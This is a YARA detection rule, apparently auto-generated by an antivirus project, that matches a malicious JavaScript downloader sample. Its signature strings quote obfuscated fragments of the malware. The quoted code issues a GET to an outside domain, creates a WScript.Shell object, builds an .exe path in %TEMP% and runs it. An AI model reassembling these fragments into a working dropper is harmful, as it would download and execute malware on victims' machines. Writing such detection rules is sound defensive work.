rule sig_20160330_cc377fb9a3eb0c9eaa2ef919b2818a61 {
  meta:
    description = "datamaliciousorder - file 20160330_cc377fb9a3eb0c9eaa2ef919b2818a61.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ddd3020c0c7d1bd4487d27d1c4c2a20dd02a59665a26d64da99690bad6a215dd"

  strings:
    $s1  = "_U[_Q](\"GET\", \"http://rocketsrange.com/b5ksa\", false);" fullword ascii
    $s2  = "function _A0(_AV, _Z){_X = _X * 1; return _AV - _Z;};" fullword ascii
    $s3  = "var _NC = function _A() {return WScript[_UP](\"WScript\"+\".Shell\");}(), _I0 = 11;" fullword ascii
    $s4  = "if (_U[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _NT(){return _EW + \"\";};" fullword ascii
    $s6  = "function _R() {return _NC[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Q9yaIArYU.ex\" + \"e\";};" fullword ascii
    $s7  = "function _VP(_SC){_NC[\"Run\"](_SC, _X, _X);};" fullword ascii
    $s8  = "function _EE() {return ((_EQ == true) && (_EQ == _H)) ? 1 : _X;};" fullword ascii
    $s9  = "function _B()" fullword ascii
    $s10 = " while (_KS){" fullword ascii
    $s11 = "var _BX = new this[\"Date\"]();" fullword ascii
    $s12 = "function _B0(){return 22;};" fullword ascii
    $s13 = "function _HK(_SV) {var _J = (1, 2, 3, 4, 5, _SV); return _J;};" fullword ascii
    $s14 = "function _HP(){return _UP;};" fullword ascii
    $s15 = "return _A0(_S, _E0);" fullword ascii
    $s16 = "var _H = false;" fullword ascii
    $s17 = "var _O = false;" fullword ascii
    $s18 = "_H = true; " fullword ascii
    $s19 = "var _EQ = false;" fullword ascii
    $s20 = "_EQ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}